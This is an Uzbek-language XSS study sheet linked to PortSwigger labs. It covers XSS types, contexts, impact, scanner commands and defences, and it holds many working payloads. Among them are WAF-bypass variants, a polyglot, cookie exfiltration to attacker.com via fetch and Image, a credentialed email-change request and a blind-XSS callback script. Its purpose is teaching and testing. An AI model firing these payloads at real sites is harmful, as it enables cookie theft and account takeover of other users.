# Cross-Site Scripting (XSS)

> Lab yechimlari (PortSwigger'ning 30 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Sayt senga ko'rsatadigan sahifaga sening inputingni (qidiruv, comment, ism) qo'shadi. Agar shu
inputni **tozalamay/encode qilmay** HTML'ga joylasa — sen `<script>` yoki event handler tiqib,
JavaScript'ingni **boshqa foydalanuvchining brauzerida** ishga tushirasan. Script o'sha odamning
sayt bilan bo'lgan session'i ichida (uning cookie'si, uning huquqi bilan) ishlaydi.

**Ildiz sabab:** ma'lumot (sen yozgan matn) va kod (HTML/JS) aralashib ketgan. Brauzer sening
matningni "kontent" emas, "bajariladigan kod" deb o'qiydi. Zarar serverda emas — **qurbonning
brauzerida** sodir bo'ladi, shuning uchun u sening zararli kodingni o'z huquqi bilan bajaradi.

## Qanday ishlaydi (minimal misol)
```
Zaif kod:   echo "<h1>Natija: " . $_GET['q'] . "</h1>";
Kiritasan:  ?q=<script>alert(document.cookie)</script>
Sahifa:     <h1>Natija: <script>alert(document.cookie)</script></h1>  → script ishlaydi
```

## Turlari

### Joylashuvi/saqlanishi bo'yicha
- **Reflected** — payload URL/so'rovda, o'sha javobda darhol qaytadi. Qurbonga maxsus link yuborasan
  (bir martalik, faqat link bosgan odamga). Odatda **Medium**.
- **Stored (Persistent)** — payload serverda saqlanadi (comment, profil, ism) → sahifani **har**
  ochgan odamga o'z-o'zidan uriladi. Qurbon ham kerak emas. Odatda **High**.
- **DOM-based** — server umuman aralashmaydi, hammasi client JS'da (source→sink). `05_DOM_BASED`.
- **Blind** — payload ko'rinmas joyda saqlanib, keyinroq boshqa joyda (admin ticket paneli, log
  ko'ruvchi) otiladi. Callback (XSS Hunter) bilan ushlaysan.

### Kontekst bo'yicha (payload qayerga tushadi — exploit shunga bog'liq)
- **HTML tanasi** — `<script>`/`<img onerror>` to'g'ridan ishlaydi.
- **HTML atributi** — avval `"` bilan atributdan chiqib, keyin event qo'shasan.
- **JavaScript stringi** — `'`/`"` yopib, kod qo'shasan yoki `</script>` bilan blokni yopasan.
- **URL/`href`** — `javascript:` sxemasi.
- **CSS/template** — maxsus holatlar (`${}`, expression).

## Oqibatlar (IMPACT) — nega bu og'ir
- **Session/cookie o'g'irlash** → qurbonning akkauntiga to'liq kirasan (ATO).
- **CSRF token o'g'irlash** → himoyani aylanib istagan harakatni qilasan (email/parol o'zgartirish).
- **Qurbon nomidan so'rov** → `fetch(..., credentials:'include')` bilan uning huquqida amal.
- **Keylogger / soxta login forma** → parol, karta ma'lumotini yig'asan.
- **Admin'da Stored XSS** → admin cookie/sessiya → butun boshqaruv paneli seniki = worm/to'liq egallash.
- **Browser exploit** → ba'zan tizimga chiqish (kam, lekin bor).
> Reflected = Medium, Stored = High, admin'da Stored = **Critical**. Severity qurbon kim ekaniga bog'liq.

## Qayerdan qidiriladi
Qidiruv, comment, profil ism/bio, manzil, 404 sahifa, `Referer`, `User-Agent`, fayl
nomi, PDF/export, error xabar.

## Aniqlash
```html
xss7731                 <!-- unikal marker tashla, javobda qaysi kontekstda chiqishini ko'r -->
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
```

## Payloadlar — kontekst bo'yicha
```html
<!-- HTML ichida -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- Atribut ichida (" bilan chiqib ket) -->
"><svg onload=alert(1)>
" autofocus onfocus=alert(1) x="

<!-- <script> ichida (JS konteksti) -->
</script><img src=x onerror=alert(1)>
';alert(1)//
`-alert(1)-`

<!-- href / javascript: -->
javascript:alert(1)
```

## Real udar — cookie exfiltration
```html
<script>fetch('https://attacker.com/c?'+document.cookie)</script>
<script>new Image().src='https://attacker.com/c?'+document.cookie</script>
```
Cookie `HttpOnly` bo'lsa — cookie o'qib bo'lmaydi, o'rniga harakat bajar:
```html
<script>fetch('/change_email',{method:'POST',body:'email=hacker@evil.com',
headers:{'Content-Type':'application/x-www-form-urlencoded'},credentials:'include'})</script>
```

## WAF bypass
```html
<svg onload=confirm(1)>              <!-- alert bloklansa -->
<img src onerror=alert`1`>           <!-- qavs o'rniga backtick -->
<svg onload=top["al"+"ert"](1)>      <!-- string bo'lish -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">   <!-- base64 -->
<ScRiPt>alert(1)</sCrIpT>            <!-- case aralash -->
<scr<script>ipt>alert(1)</scr</script>ipt>  <!-- nested, filtr bir marta o'chirsa -->
<svg/onload=alert(1)>                <!-- probel o'rniga / -->
<input autofocus onfocus=alert(1)>   <!-- script bloklansa, noyob teg -->
```

## TOOLLAR

### dalfox — eng zo'r XSS skaneri
```bash
dalfox url "https://target.com/search?q=FUZZ"
```
> Parametrni sinab, qaysi kontekstda aks etishini aniqlab, ishlaydigan payloadni o'zi tanlaydi.

```bash
cat urls.txt | gf xss | dalfox pipe
```
> gf ajratgan XSS-potensial URL'larni ketma-ket haydaydi — ommaviy skan.

```bash
dalfox url "URL" --custom-payload payloads.txt -b your.xss.ht
```
> O'z payloadlaring bilan, blind XSS uchun callback domeningni (`-b`) qo'yadi.

### XSStrike — kontekst analiz + bypass
```bash
python3 xsstrike.py -u "https://target.com/?q=test"
```
> Reflektsiya kontekstini tahlil qilib, WAF'ni ham chamalab, mos payload yasaydi.

### kxss / Gxss — reflektsiya tekshirgich
```bash
cat all_urls.txt | kxss
```
> Qaysi parametr javobga aks etadi va qaysi maxsus belgi filtrlanmaydi — tez ko'rsatadi.

### nuclei — DOM/reflected shablon
```bash
katana -u https://target.com -jc | nuclei -t ~/nuclei-templates/http/vulnerabilities/xss/
```
> Crawl qilingan URL'larni tayyor XSS shablonlari bilan uradi.

### Blind XSS — XSS Hunter / interactsh
```bash
# payloadga callback qo'yasan, admin panelida otilса — senga xabar keladi
"><script src=https://your.xss.ht></script>
```
> Ko'rinmas joyda (admin ticket, log) ishga tushganini callback orqali bilasan.

## Polyglot (ko'p kontekstda ishlaydi)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Himoya
Kontekstga mos output encoding, CSP (nonce/hash), `HttpOnly`+`Secure`+`SameSite` cookie,
DOMPurify bilan sanitize, framework auto-escape (React'da `dangerouslySetInnerHTML`dan qoch).
